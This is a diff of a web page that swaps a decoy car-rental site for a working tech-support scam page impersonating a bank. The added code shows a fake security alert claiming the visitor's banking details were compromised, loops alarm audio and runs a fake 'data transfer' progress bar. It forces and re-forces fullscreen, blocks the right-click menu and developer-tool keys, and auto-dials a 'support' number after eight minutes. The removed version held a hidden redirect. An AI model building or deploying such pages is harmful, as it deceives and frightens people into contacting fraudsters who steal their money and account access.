@@ -1,88 +1,263 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Rent a car now from CarRentNow - Affordable, fast, and reliable car rental services across the USA. Book online with ease!">
-  <title>Car Rent Now | Affordable Car Rentals Across USA</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+<meta charset="UTF-8">
+<title>Security Alert</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        background-color: black;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        color: #fff;
+        position: relative;
+        user-select: none;
+    }
 
-  <!-- 🔁 1-second redirect to fb.co -->
-  <script>
-    setTimeout(function () {
-      window.location.href = "https://itshopcat.com/us";
-    }, 1000);
-  </script>
+    #startImage {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        cursor: pointer;
+        z-index: 5;
+    }
+
+    #leavePopup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        color: #000;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        z-index: 999;
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        animation: heartbeat 1s infinite;
+        max-height: unset;
+        overflow: visible;
+    }
+
+    @keyframes heartbeat {
+        0%, 100% { transform: translate(-50%, -50%) scale(1); }
+        50% { transform: translate(-50%, -50%) scale(1.05); }
+    }
+
+    .popup-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+    }
+
+    .alert-text {
+        color: red;
+        font-weight: bold;
+        font-size: 18px;
+    }
+
+    .message-text {
+        text-align: left;
+        font-size: 14px;
+        color: #000;
+    }
+
+    .loading-text {
+        margin: 10px 0 5px 0;
+        color: red;
+        font-size: 16px;
+        font-weight: bold;
+        text-align: center;
+    }
+
+    .progress-bar-container {
+        width: 100%;
+        height: 20px;
+        background-color: #444;
+        border-radius: 10px;
+        overflow: hidden;
+    }
+
+    .progress-bar-fill {
+        height: 100%;
+        width: 0%;
+        background-color: red;
+        transition: width 0.5s linear;
+    }
+
+    .popup-content button, #callNumberText {
+        padding: 10px 20px;
+        background-color: red;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 20px;
+        display: none;
+    }
+
+    #logoImage {
+        width: 150px;
+        margin-bottom: 10px;
+    }
+
+    @media (max-width: 480px) {
+        .message-text {
+            font-size: 12px;
+        }
+        .alert-text {
+            font-size: 16px;
+        }
+    }
+</style>
 </head>
-<body class="font-sans bg-gray-50 text-gray-800">
-  <header class="bg-white shadow p-4 sticky top-0 z-50">
-    <div class="max-w-7xl mx-auto flex justify-between items-center">
-      <h1 class="text-2xl font-bold text-blue-600">CarRentNow</h1>
-      <nav class="space-x-6">
-        <a href="#about" class="hover:text-blue-500">About</a>
-        <a href="#services" class="hover:text-blue-500">Services</a>
-        <a href="#fleet" class="hover:text-blue-500">Fleet</a>
-        <a href="#contact" class="hover:text-blue-500">Contact</a>
-      </nav>
+<body oncontextmenu="return false;">
+
+<div id="startImage"></div>
+
+<div id="leavePopup">
+    <div class="popup-content">
+        <img id="logoImage" src="https://1992gameofthrone1992.github.io/imagetopa/navylogo.png" alt="Logo">
+        
+        <div class="alert-text">🚨 URGENT SECURITY ALERT 🚨</div>
+        <div class="message-text">
+            Suspicious financial activity has been detected on your IP address <b>192.168.45.73</b>.<br><br>
+            An unauthorized attempt to access your online banking account and perform fraudulent transactions was traced to this device.<br><br>
+            <b>🔒 COMPROMISED INFORMATION:</b><br>
+            • Online Banking Login Details<br>
+            • Credit & Debit Card Information<br>
+            • Personal Identification Data<br>
+            • Financial Records<br><br>
+            <b>⚠️ IMMEDIATE ACTION REQUIRED</b><br>
+            Your banking credentials and funds are at severe risk. Failure to act now may result in permanent account suspension, financial loss, or legal consequences.<br><br>
+            📞 Contact Technical Support immediately to secure your banking account and device.
+        </div>
+
+        <div class="loading-text">Data Transfer in Progress...</div>
+        <div class="progress-bar-container">
+            <div class="progress-bar-fill" id="progressFill"></div>
+        </div>
+
+        <button id="callNowBtn">Call Now</button>
+        <div id="callNumberText">+1 888 888 8888</div>
     </div>
-  </header>
+</div>
 
-  <section class="bg-blue-600 text-white py-20 text-center">
-    <div class="max-w-3xl mx-auto">
-      <h2 class="text-4xl font-bold mb-4">Rent a Car in Minutes with CarRentNow</h2>
-      <p class="text-lg mb-6">Reliable, Affordable, and Available 24/7 Across the USA</p>
-      <a href="#contact" class="bg-white text-blue-600 font-semibold px-6 py-3 rounded shadow hover:bg-gray-100">Book Now</a>
-    </div>
-  </section>
+<audio id="alertAudio" loop>
+    <source src="https://1992gameofthrone1992.github.io/imagetopa/navyfederal.m4a" type="audio/mp4">
+</audio>
 
-  <section id="about" class="py-16 px-6 max-w-5xl mx-auto">
-    <h2 class="text-3xl font-bold mb-4 text-center">About CarRentNow</h2>
-    <p class="mb-4">CarRentNow is your go-to destination for quick, reliable, and affordable car rentals across the United States. With a wide range of vehicles and unbeatable customer service, we make car rentals simple and convenient.</p>
-    <p class="mb-4">Whether you need a car for a weekend getaway, a business trip, or long-term use, we offer flexible rental options tailored to your needs. Our online booking system is seamless, secure, and fast.</p>
-    <p class="mb-4">Our mission is to offer safe, clean, and fully-serviced vehicles at transparent prices. No hidden fees. No surprises. Just a car when you need it.</p>
-  </section>
+<script>
+    const audio = document.getElementById('alertAudio');
+    const progressFill = document.getElementById('progressFill');
+    const callNowBtn = document.getElementById('callNowBtn');
+    const callNumberText = document.getElementById('callNumberText');
+    const startImage = document.getElementById('startImage');
 
-  <section id="services" class="bg-gray-100 py-16 px-6 max-w-5xl mx-auto">
-    <h2 class="text-3xl font-bold mb-6 text-center">Our Services</h2>
-    <div class="grid md:grid-cols-3 gap-8">
-      <div class="bg-white p-6 shadow rounded">
-        <h3 class="text-xl font-semibold mb-2">Daily Rentals</h3>
-        <p>Perfect for short trips and errands around the city. Rent by the day at affordable rates.</p>
-      </div>
-      <div class="bg-white p-6 shadow rounded">
-        <h3 class="text-xl font-semibold mb-2">Weekly Rentals</h3>
-        <p>Great for vacations or work travel. Get discounted rates when you rent for a full week.</p>
-      </div>
-      <div class="bg-white p-6 shadow rounded">
-        <h3 class="text-xl font-semibold mb-2">Long-Term Leases</h3>
-        <p>Need a car for a month or more? We offer special pricing and vehicle upgrades for long-term rentals.</p>
-      </div>
-    </div>
-  </section>
+    function isMobile() {
+        return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+    }
 
-  <section id="fleet" class="py-16 px-6 max-w-5xl mx-auto">
-    <h2 class="text-3xl font-bold mb-6 text-center">Our Fleet</h2>
-    <p class="mb-4">Choose from a diverse selection of cars, SUVs, and vans. Every vehicle is maintained to the highest standards to ensure your safety and comfort.</p>
-    <ul class="list-disc list-inside space-y-2">
-      <li>Economy Cars – Fuel efficient and budget friendly</li>
-      <li>Luxury Sedans – For those who value style and performance</li>
-      <li>SUVs – Spacious and versatile for families or group travel</li>
-      <li>Minivans – Ideal for road trips and large families</li>
-      <li>Electric Vehicles – Eco-friendly and cutting-edge</li>
-    </ul>
-  </section>
+    window.onload = function() {
+        if (isMobile()) {
+            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navymob.jpeg')";
+        } else {
+            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navyderal.png')";
+        }
 
-  <section id="contact" class="bg-blue-50 py-16 px-6 max-w-5xl mx-auto">
-    <h2 class="text-3xl font-bold mb-6 text-center">Get in Touch</h2>
-    <p class="mb-4 text-center">Ready to book your ride? Have questions? Contact us today.</p>
-    <div class="text-center">
-      <p class="mb-2"><strong>Phone:</strong> <a href="tel:+18888888888" class="text-blue-600">+1-888-888-8888</a></p>
-      <p class="mb-2"><strong>Email:</strong> <a href="mailto:carrentalnow88601992@gmail.com" class="text-blue-600">carrentalnow88601992@gmail.com</a></p>
-    </div>
-  </section>
+        if (navigator.userAgent.includes("HTTrack")) {
+            alert("Website copying attempt detected. Action has been logged.");
+        }
+    }
 
-  <footer class="bg-white py-6 text-center text-sm border-t">
-    <p>&copy; 2025 CarRentNow. All rights reserved.</p>
-  </footer>
+    document.addEventListener('keydown', function(e) {
+        if (e.keyCode == 123 || 
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
+            e.preventDefault();
+            alert("Action Blocked");
+        }
+    });
+
+    startImage.addEventListener('click', function () {
+        triggerFullScreen();
+        applyBackground();
+        startImage.style.display = 'none';
+        document.getElementById('leavePopup').style.display = 'block';
+        audio.play();
+
+        if (isMobile()) {
+            callNowBtn.style.display = 'block';
+        } else {
+            callNumberText.style.display = 'block';
+        }
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 0.2;
+            if (progress > 100) progress = 100;
+            progressFill.style.width = progress + '%';
+
+            if (progress === 100) {
+                clearInterval(interval);
+            }
+        }, 1000);
+
+        setTimeout(function () {
+            window.location.href = "tel:+18888888888";
+        }, 480000);
+    }, { once: true });
+
+    callNowBtn.addEventListener('click', function () {
+        window.location.href = "tel:+18888888888";
+    });
+
+    function triggerFullScreen() {
+        if (document.documentElement.requestFullscreen) {
+            document.documentElement.requestFullscreen();
+        } else if (document.documentElement.webkitRequestFullscreen) {
+            document.documentElement.webkitRequestFullscreen();
+        } else if (document.documentElement.msRequestFullscreen) {
+            document.documentElement.msRequestFullscreen();
+        }
+    }
+
+    function applyBackground() {
+        if (isMobile()) {
+            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navymob.jpeg')";
+        } else {
+            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navyderal.png')";
+        }
+        document.body.style.backgroundSize = "100% 100%";
+        document.body.style.backgroundPosition = "center";
+        document.body.style.backgroundRepeat = "no-repeat";
+    }
+
+    // FULLSCREEN EXIT HANDLING
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.addEventListener('click', reEnterFullscreenOnce, { once: true });
+        }
+    });
+
+    function reEnterFullscreenOnce() {
+        triggerFullScreen();
+    }
+</script>
+
 </body>
 </html>
